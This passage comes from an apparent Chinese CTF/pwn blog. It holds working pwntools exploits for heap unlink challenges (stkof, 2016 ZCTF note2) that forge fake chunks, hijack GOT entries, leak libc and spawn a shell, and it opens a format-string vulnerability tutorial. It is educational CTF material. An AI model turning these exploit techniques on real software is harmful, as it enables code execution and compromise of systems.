class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(&#39;OK\n&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    # trigger to malloc buffer for io function</span><br><span class="line">    alloc(0x100)  # idx 1</span><br><span class="line">    # begin</span><br><span class="line">    alloc(0x30)  # idx 2</span><br><span class="line">    # small chunk size in order to trigger unlink</span><br><span class="line">    alloc(0x80)  # idx 3</span><br><span class="line">    # a fake chunk at global[2]&#x3D;head+16 who&#39;s size is 0x20</span><br><span class="line">    payload &#x3D; p64(0)  #prev_size</span><br><span class="line">    payload +&#x3D; p64(0x20)  #size</span><br><span class="line">    payload +&#x3D; p64(head + 16 - 0x18)  #fd</span><br><span class="line">    payload +&#x3D; p64(head + 16 - 0x10)  #bk</span><br><span class="line">    payload +&#x3D; p64(0x20)  # next chunk&#39;s prev_size bypass the check</span><br><span class="line">    payload &#x3D; payload.ljust(0x30, &#39;a&#39;)</span><br><span class="line"></span><br><span class="line">    # overwrite global[3]&#39;s chunk&#39;s prev_size</span><br><span class="line">    # make it believe that prev chunk is at global[2]</span><br><span class="line">    payload +&#x3D; p64(0x30)</span><br><span class="line"></span><br><span class="line">    # make it believe that prev chunk is free</span><br><span class="line">    payload +&#x3D; p64(0x90)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line"></span><br><span class="line">    # unlink fake chunk, so global[2] &#x3D;&amp;(global[2])-0x18&#x3D;head-8</span><br><span class="line">    free(3)</span><br><span class="line">    p.recvuntil(&#39;OK\n&#39;)</span><br><span class="line"></span><br><span class="line">    # overwrite global[0] &#x3D; free@got, global[1]&#x3D;puts@got, global[2]&#x3D;atoi@got</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 8 + p64(stkof.got[&#39;free&#39;]) + p64(stkof.got[&#39;puts&#39;]) + p64(</span><br><span class="line">        stkof.got[&#39;atoi&#39;])</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line"></span><br><span class="line">    # edit free@got to puts@plt</span><br><span class="line">    payload &#x3D; p64(stkof.plt[&#39;puts&#39;])</span><br><span class="line">    edit(0, len(payload), payload)</span><br><span class="line"></span><br><span class="line">    # free global[1] to leak puts addr</span><br><span class="line">    free(1)</span><br><span class="line">    puts_addr &#x3D; p.recvuntil(&#39;\nOK\n&#39;, drop&#x3D;True).ljust(8, &#39;\x00&#39;)</span><br><span class="line">    puts_addr &#x3D; u64(puts_addr)</span><br><span class="line">    log.success(&#39;puts addr: &#39; + hex(puts_addr))</span><br><span class="line">    libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">    binsh_addr &#x3D; libc_base + next(libc.search(&#39;&#x2F;bin&#x2F;sh&#39;))</span><br><span class="line">    system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">    log.success(&#39;libc base: &#39; + hex(libc_base))</span><br><span class="line">    log.success(&#39;&#x2F;bin&#x2F;sh addr: &#39; + hex(binsh_addr))</span><br><span class="line">    log.success(&#39;system addr: &#39; + hex(system_addr))</span><br><span class="line"></span><br><span class="line">    # modify atoi@got to system addr</span><br><span class="line">    payload &#x3D; p64(system_addr)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813112557290.png" alt="image-20210813112557290" style="zoom:50%;">

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813112630353.png" alt="image-20210813112630353"></p>
<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2">题目链接</a></p>
<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先，我们先分析一下程序，可以看出程序的主要功能为</p>
<ul>
<li>添加 note，size 限制为 0x80，size 会被记录，note 指针会被记录。</li>
<li>展示 note 内容。</li>
<li>编辑 note 内容，其中包括覆盖已有的 note，在已有的 note 后面添加内容。</li>
<li>释放 note。</li>
</ul>
<p>仔细分析后，可以发现程序有以下几个问题</p>
<ol>
<li>在添加 note 时，程序会记录 note 对应的大小，该大小会用于控制读取 note 的内容，但是读取的循环变量 i 是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入 size 为 0 时，glibc 根据其规定，会分配 0x20 个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。</li>
<li>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。</li>
</ol>
<p>第一个问题对应在 ida 中的代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 __fastcall ReadStr(char *s, __int64 len, char a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; &#x2F;&#x2F; [rsp+Ch] [rbp-34h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+2Fh] [rbp-11h]</span><br><span class="line">  unsigned __int64 i; &#x2F;&#x2F; [rsp+30h] [rbp-10h]</span><br><span class="line">  ssize_t v7; &#x2F;&#x2F; [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; a3;</span><br><span class="line">  for ( i &#x3D; 0LL; len - 1 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 &#x3D; read(0, &amp;buf, 1uLL);</span><br><span class="line">    if ( v7 &lt;&#x3D; 0 )</span><br><span class="line">      exit(-1);</span><br><span class="line">    if ( buf &#x3D;&#x3D; v4 )</span><br><span class="line">      break;</span><br><span class="line">    s[i] &#x3D; buf;</span><br><span class="line">  &#125;</span><br><span class="line">  s[i] &#x3D; 0;</span><br><span class="line">  return i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 i 是 unsigned 类型，a2 为 int 类型，所以两者在 for 循环相比较的时候，a2-1 的结果 - 1 会被视为 unsigned 类型，此时，即最大的整数。所以说可以读取任意长度的数据，这里也就是后面我们溢出所使用的办法。</p>
<h3 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h3><p>这里我们主要利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。</p>
<p>下面依次进行讲解。</p>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>首先，我们先把 note 可能的基本操作列举出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; process(&#39;.&#x2F;note2&#39;)</span><br><span class="line">note2 &#x3D; ELF(&#39;.&#x2F;note2&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def newnote(length, content):</span><br><span class="line">    p.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.recvuntil(&#39;(less than 128)&#39;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&#39;content:&#39;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shownote(id):</span><br><span class="line">    p.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.recvuntil(&#39;note:&#39;)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def editnote(id, choice, s):</span><br><span class="line">    p.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line">    p.recvuntil(&#39;note:&#39;)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(&#39;2.append]&#39;)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def deletenote(id):</span><br><span class="line">    p.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">    p.sendline(&#39;4&#39;)</span><br><span class="line">    p.recvuntil(&#39;note:&#39;)</span><br><span class="line">    p.sendline(str(id))</span><br></pre></td></tr></table></figure>

<p>生成三个note</p>
<p>构造三个 chunk，chunk0、chunk1 和 chunk2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># chunk0: a fake chunk</span><br><span class="line">ptr &#x3D; 0x0000000000602120</span><br><span class="line">fakefd &#x3D; ptr - 0x18</span><br><span class="line">fakebk &#x3D; ptr - 0x10</span><br><span class="line">content &#x3D; &#39;a&#39; * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + &#39;b&#39; * 64 + p64(0x60)</span><br><span class="line">#content &#x3D; p64(fakefd) + p64(fakebk)</span><br><span class="line">newnote(128, content)</span><br><span class="line"># chunk1: a zero size chunk produce overwrite</span><br><span class="line">newnote(0, &#39;a&#39; * 8)</span><br><span class="line"># chunk2: a chunk to be overwrited and freed</span><br><span class="line">newnote(0x80, &#39;b&#39; * 16)</span><br></pre></td></tr></table></figure>

<p>其中这三个 chunk 申请时的大小分别为 0x80，0，0x80，chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该 note 输入任意长的字符串。</p>
<p>这里需要注意的是，chunk0 中一共构造了两个 chunk</p>
<ul>
<li>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</li>
<li>chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><br><span class="line">if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      \</span><br><span class="line">  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br></pre></td></tr></table></figure>

<p>当构造完三个note后，堆的基本构造如下图1所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                                   +-----------------+ high addr</span><br><span class="line">                                   |      ...        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |      &#39;b&#39;*8      |</span><br><span class="line">                ptr[2]-----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                 ptr[1]----------&gt; +-----------------+  chunk 1</span><br><span class="line">                                   |    size&#x3D;0x20    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|-------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |  prev_size&#x3D;0x60 |</span><br><span class="line">fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+</span><br><span class="line">                                   |    64*&#39;a&#39;       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakebk       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakefd       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0x61         |  chunk 0</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a *8        |</span><br><span class="line">                 ptr[0]----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prev_size    |</span><br><span class="line">                                   +-----------------+  low addr</span><br><span class="line">                                           图1</span><br></pre></td></tr></table></figure>

<h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1 - 覆盖 chunk2 - 释放 chunk2"></a>释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</h4><p>对应的代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># edit the chunk1 to overwrite the chunk2</span><br><span class="line">deletenote(1)</span><br><span class="line">content &#x3D; &#39;a&#39; * 16 + p64(0xa0) + p64(0x90)</span><br><span class="line">newnote(0, content)</span><br><span class="line"># delete note 2 to trigger the unlink</span><br><span class="line"># after unlink, ptr[0] &#x3D; ptr - 0x18</span><br><span class="line">deletenote(2)</span><br></pre></td></tr></table></figure>

<p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                                   +-----------------+high addr</span><br><span class="line">                                   |      ...        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |   &#39;\x00&#39;+&#39;b&#39;*7  |</span><br><span class="line">                ptr[2]-----------&gt; +-----------------+ chunk 2</span><br><span class="line">                                   |    size&#x3D;0x90    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0xa0         |</span><br><span class="line">                                   +-----------------|------------</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a&#39;*8        |</span><br><span class="line">                 ptr[1]----------&gt; +-----------------+ chunk 1</span><br><span class="line">                                   |    size&#x3D;0x20    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prevsize     |</span><br><span class="line">                                   +-----------------|-------------</span><br><span class="line">                                   |    unused       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |  prev_size&#x3D;0x60 |</span><br><span class="line">fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+</span><br><span class="line">                                   |    64*&#39;a&#39;       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakebk       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    fakefd       |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    0x61         |  chunk 0</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    &#39;a *8        |</span><br><span class="line">                 ptr[0]----------&gt; +-----------------+</span><br><span class="line">                                   |    size&#x3D;0x91    |</span><br><span class="line">                                   +-----------------+</span><br><span class="line">                                   |    prev_size    |</span><br><span class="line">                                   +-----------------+  low addr</span><br><span class="line">                                           图2</span><br></pre></td></tr></table></figure>

<p>该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br></pre></td></tr></table></figure>

<p>unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p>
<h4 id="获取-system-地址"><a href="#获取-system-地址" class="headerlink" title="获取 system 地址"></a>获取 system 地址</h4><p>代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># overwrite the chunk0(which is ptr[0]) with got atoi</span><br><span class="line">atoi_got &#x3D; note2.got[&#39;atoi&#39;]</span><br><span class="line">content &#x3D; &#39;a&#39; * 0x18 + p64(atoi_got)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line"># get the aoti addr</span><br><span class="line">shownote(0)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;is &#39;)</span><br><span class="line">atoi_addr &#x3D; sh.recvuntil(&#39;\n&#39;, drop&#x3D;True)</span><br><span class="line">print atoi_addr</span><br><span class="line">atoi_addr &#x3D; u64(atoi_addr.ljust(8, &#39;\x00&#39;))</span><br><span class="line">print &#39;leak atoi addr: &#39; + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"># get system addr</span><br><span class="line">atoi_offest &#x3D; libc.symbols[&#39;atoi&#39;]</span><br><span class="line">libcbase &#x3D; atoi_addr - atoi_offest</span><br><span class="line">system_offest &#x3D; libc.symbols[&#39;system&#39;]</span><br><span class="line">system_addr &#x3D; libcbase + system_offest</span><br><span class="line"></span><br><span class="line">print &#39;leak system addr: &#39;, hex(system_addr)</span><br></pre></td></tr></table></figure>

<p>我们修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当我们再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里我们将其覆盖为 atoi 的地址。 这样的话，如果我们查看 note 0 的内容，其实查看的就是 atoi 的地址。</p>
<p>之后我们根据 libc 中对应的偏移计算出 system 的地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># overwrite the atoi got with systemaddr</span><br><span class="line">content &#x3D; p64(system_addr)</span><br><span class="line">editnote(0, 1, content)</span><br></pre></td></tr></table></figure>

<p>由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 system 地址。</p>
<h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># get shell</span><br><span class="line">sh.recvuntil(&#39;option---&gt;&gt;&#39;)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到 shell 了。</p>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io &#x3D; remote(&#39;node3.buuoj.cn&#39;,26189)</span><br><span class="line">#io &#x3D; process(&quot;.&#x2F;note2&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;note2&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.23-64.so&quot;)</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def new_note(size, content):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;)&quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def show_note(index):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit_note(index, choice, content):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.recvuntil(&quot;]&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete_note(index):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvuntil(&quot;:&quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">io.sendline(&quot;&#x2F;bin&#x2F;sh&quot;) #name</span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">io.sendline(&quot;ddd&quot;)</span><br><span class="line"></span><br><span class="line">ptr_0 &#x3D; 0x602120</span><br><span class="line">fake_fd &#x3D; ptr_0 - 0x18</span><br><span class="line">fake_bk &#x3D; ptr_0 - 0x10</span><br><span class="line"></span><br><span class="line">note0_content &#x3D; &quot;\x00&quot; * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)</span><br><span class="line">new_note(0x80, note0_content) #note0</span><br><span class="line">new_note(0x0, &quot;aa&quot;) #note1</span><br><span class="line">new_note(0x80, &quot;&#x2F;bin&#x2F;sh&quot;) #note2</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">delete_note(1)</span><br><span class="line">note1_content &#x3D; &quot;\x00&quot; * 16 + p64(0xa0) + p64(0x90)</span><br><span class="line">new_note(0x0, note1_content)</span><br><span class="line"></span><br><span class="line">delete_note(2) #unlink</span><br><span class="line">#gdb.attach(io)</span><br><span class="line"># 泄漏libc</span><br><span class="line">free_got &#x3D; elf.got[&quot;free&quot;]</span><br><span class="line">payload &#x3D; 0x18 * &quot;a&quot; + p64(free_got)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">edit_note(0, 1, payload)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">show_note(0)</span><br><span class="line">io.recvuntil(&quot;is &quot;)</span><br><span class="line"></span><br><span class="line">free_addr &#x3D; u64(io.recv(6).ljust(8, &quot;\x00&quot;))</span><br><span class="line">libc_addr &#x3D; free_addr - libc.symbols[&quot;free&quot;]</span><br><span class="line">print(&quot;libc address: &quot; + hex(libc_addr))</span><br><span class="line"></span><br><span class="line">#get shell</span><br><span class="line">system_addr &#x3D; libc_addr + libc.symbols[&quot;system&quot;]</span><br><span class="line">one_gadget &#x3D; libc_addr + 0xf02a4</span><br><span class="line">edit_note(0, 1, p64(one_gadget)) #overwrite free got -&gt; system address</span><br><span class="line">#io.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2021/02/08/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="格式化字符串漏洞原理介绍"><a href="#格式化字符串漏洞原理介绍" class="headerlink" title="格式化字符串漏洞原理介绍"></a>格式化字符串漏洞原理介绍</h1><h2 id="格式化字符串函数介绍"><a href="#格式化字符串函数介绍" class="headerlink" title="格式化字符串函数介绍"></a>格式化字符串函数介绍</h2><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p>
<ul>
<li>格式化字符串函数</li>
<li>格式化字符串</li>
<li>后续参数，<strong>可选</strong></li>
</ul>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/printf.png" alt="img"></p>
<a id="more"></a>

<h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>常见的有格式化字符串函数有</p>
<ul>
<li>输入<ul>
<li>scanf</li>
</ul>
</li>
<li>输出</li>
</ul>
<table>
<thead>
<tr>
<th>函数</th>
<th>基本介绍</th>
</tr>
</thead>
<tbody><tr>
<td>printf</td>
<td>输出到 stdout</td>
</tr>
<tr>
<td>fprintf</td>
<td>输出到指定 FILE 流</td>
</tr>
<tr>
<td>vprintf</td>
<td>根据参数列表格式化输出到 stdout</td>
</tr>
<tr>
<td>vfprintf</td>
<td>根据参数列表格式化输出到指定 FILE 流</td>
</tr>
<tr>
<td>sprintf</td>
<td>输出到字符串</td>
</tr>
<tr>
<td>snprintf</td>
<td>输出指定字节数到字符串</td>
</tr>
<tr>
<td>vsprintf</td>
<td>根据参数列表格式化输出到字符串</td>
</tr>
<tr>
<td>vsnprintf</td>
<td>根据参数列表格式化输出指定字节到字符串</td>
</tr>
<tr>
<td>setproctitle</td>
<td>设置 argv</td>
</tr>
<tr>
<td>syslog</td>
<td>输出日志</td>
</tr>
<tr>
<td>err, verr, warn, vwarn 等</td>
<td>。。。</td>
</tr>
</tbody></table>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>这里我们了解一下格式化字符串的格式，其基本格式如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>

<p>每一种 pattern 的含义请具体参考维基百科的<a href="https://zh.wikipedia.org/wiki/格式化字符串">格式化字符串</a> 。以下几个 pattern 中的对应选择需要重点关注</p>
<p> 这里我们了解一下格式化字符串的格式，其基本格式如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>

<p>每一种 pattern 的含义请具体参考维基百科的<a href="https://zh.wikipedia.org/wiki/格式化字符串">格式化字符串</a> 。以下几个 pattern 中的对应选择需要重点关注</p>
<ul>
<li>parameter<ul>
<li>n$，获取格式化字符串中的指定参数</li>
</ul>
</li>
<li>flag</li>
<li>field width<ul>
<li>输出的最小宽度</li>
</ul>
</li>
<li>precision<ul>
<li>输出的最大长度</li>
</ul>
</li>
<li>length，输出的长度<ul>
<li>hh，输出一个字节</li>
<li>h，输出一个双字节</li>
</ul>
</li>
<li>type<ul>
<li>d/i，有符号整数</li>
<li>u，无符号整数</li>
<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
<li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
<li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>
<li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>
<li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li>
</ul>
</li>
</ul>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>就是相应的要输出的变量。</p>
<h2 id="格式化字符串原理"><a href="#格式化字符串原理" class="headerlink" title="格式化字符串原理"></a>格式化字符串原理</h2><p>在一开始，我们就给出格式化字符串的基本介绍，这里再说一些比较细致的内容。我们上面说，格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>。比如说’%s’表明我们会输出一个字符串参数。</p>
<p>我们再继续以上面的为例子进行介绍</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/printf-20210303175725164.png" alt="基本例子"></p>
<p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">some value</span><br><span class="line">3.14</span><br><span class="line">123456</span><br><span class="line">addr of &quot;red&quot;</span><br><span class="line">addr of format string: Color %s...</span><br></pre></td></tr></table></figure>

<p><strong>注：这里我们假设 3.14 上面的值为某个未知的值。</strong></p>
<p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
<ul>
<li>当前字符不是 %，直接输出到相应标准输出。</li>
<li>当前字符是 %， 继续读取下一个字符<ul>
<li>如果没有字符，报错</li>
<li>如果下一个字符是 %, 输出 %</li>
<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
</ul>
</li>
</ul>
<p>那么假设，此时我们在编写程序时候，写成了下面的样子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</span><br></pre></td></tr></table></figure>

<p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p>
<ol>
<li>解析其地址对应的字符串</li>
